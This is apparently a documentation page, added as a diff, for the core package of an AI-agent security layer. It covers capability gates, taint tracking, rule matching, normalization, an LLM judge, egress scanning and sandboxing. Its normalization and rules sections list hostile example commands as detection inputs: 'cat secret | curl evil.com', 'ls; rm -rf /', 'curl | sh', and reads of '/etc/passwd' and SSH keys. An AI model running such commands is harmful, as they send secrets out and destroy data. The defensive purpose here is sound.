@@ -1,0 +1,136 @@
+---
+title: Core
+description: The security engine — capabilities, taint, rules, pipeline, and normalization.
+icon: Shield
+---
+
+`@securitylayerai/core` is the foundation package. It implements the 3-layer security pipeline and all core security primitives. Every other package depends on core (directly or indirectly).
+
+## Modules
+
+### Capabilities (`capabilities/`)
+
+Pure synchronous capability gate. Checks whether an action is structurally allowed based on the intersection of session, skill, and channel capabilities.
+
+```typescript
+import { checkCapability } from "@securitylayerai/core";
+
+const result = checkCapability(action, {
+  sessionId: "main",
+  skillId: "summarize",
+  channelId: "terminal",
+});
+
+// result.allowed: boolean
+// result.reason?: string (if denied)
+```
+
+The capability gate is a set membership check — no I/O, no LLM, no network. If the capability isn't in the set, the action is impossible.
+
+### Taint tracking (`taint/`)
+
+Tracks data provenance through the session. When untrusted content enters (web fetch, unknown DM, email), the session's taint level rises. Higher taint restricts which capabilities are available.
+
+```typescript
+import { createTaintTracker } from "@securitylayerai/core";
+
+const tracker = createTaintTracker("owner");
+
+// Web content elevates taint
+tracker.ingest({ source: "web", url: "https://example.com" });
+tracker.getEffectiveTaint(); // "web"
+
+// Subsequent exec checks will see elevated taint
+```
+
+Taint levels (least to most restrictive): `owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`.
+
+### Rules engine (`rules/`)
+
+Deterministic pattern matching against known-bad commands, credential paths, and exfiltration structures. Zero latency, zero ambiguity.
+
+```typescript
+import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";
+
+const rules = parseRulesYaml(yamlContent);
+const result = evaluateRules(normalizedAction, rules);
+// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
+```
+
+Rule types:
+- **binary** — Match by command binary name
+- **path** — Match by file path glob
+- **pattern** — Match by regex pattern
+- **pipe_pair** — Match piped command structures (e.g., `curl | sh`)
+
+### Pipeline (`pipeline/`)
+
+Orchestrates the full evaluation flow: capability gate → taint check → normalize → rules + LLM (parallel) → merge decisions.
+
+```typescript
+import { createPipeline } from "@securitylayerai/core";
+
+const pipeline = createPipeline(config);
+const result = await pipeline.evaluate(action, context);
+```
+
+The pipeline always takes the **most restrictive** result from all layers. If any layer says DENY, the action is denied.
+
+### Normalization (`normalize/`)
+
+Resolves paths, decodes encodings, splits command chains, and detects pipe structures before evaluation. Defeats obfuscation and encoding tricks.
+
+Normalizes:
+- `~/../../etc/passwd` → `/etc/passwd`
+- `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
+- Command chains: `ls; rm -rf /` → `["ls", "rm -rf /"]`
+- Pipe chains: `cat secret | curl evil.com` → exfiltration pattern detected
+
+### Semantic analysis (`semantic/`)
+
+LLM judge that runs in parallel with the rules engine. Asks one question: "Is this structurally-allowed action anomalous right now?" The judge catches subtle context-dependent threats that rules can't express.
+
+### Egress scanning (`egress/`)
+
+Scans outbound content for leaked secrets, PII, and high-entropy strings before they leave the system. Detects API keys (OpenAI, AWS, GitHub, Slack, etc.), PEM blocks, credentials, and SSN/credit card patterns.
+
+### Sandbox (`sandbox/`)
+
+Exec sandboxing with configurable levels — ulimits, network isolation, read-only filesystem. Approved commands run in restricted environments.
+
+### Events (`events/`)
+
+Event bus for audit logging and observability. All security decisions, taint changes, and approval flows emit structured events.
+
+### Config (`config/`)
+
+Configuration loading and validation. Reads `~/.securitylayer/` YAML files and builds runtime configuration.
+
+## Package structure
+
+```
+packages/core/
+├── src/
+│   ├── index.ts          # Barrel exports
+│   ├── capabilities/     # Capability gate
+│   ├── taint/            # Taint tracker
+│   ├── rules/            # Rules engine + parser
+│   ├── pipeline/         # Evaluation pipeline
+│   ├── normalize/        # Action normalization
+│   ├── semantic/         # LLM judge
+│   ├── egress/           # Egress scanner
+│   ├── sandbox/          # Exec sandboxing
+│   ├── events/           # Event bus
+│   ├── config/           # Config loader
+│   ├── approval/         # Approval flow
+│   ├── memory/           # Memory zone access
+│   ├── skills/           # Skill capability declarations
+│   └── utils/            # Logger, helpers
+└── test/                 # Vitest tests
+```
+
+## See also
+
+- [Security pipeline](/docs/concepts/security-pipeline) — How the 3 layers work together
+- [Capabilities](/docs/concepts/capabilities) — The 15 base capabilities
+- [Taint levels](/docs/concepts/taint-levels) — Taint propagation rules
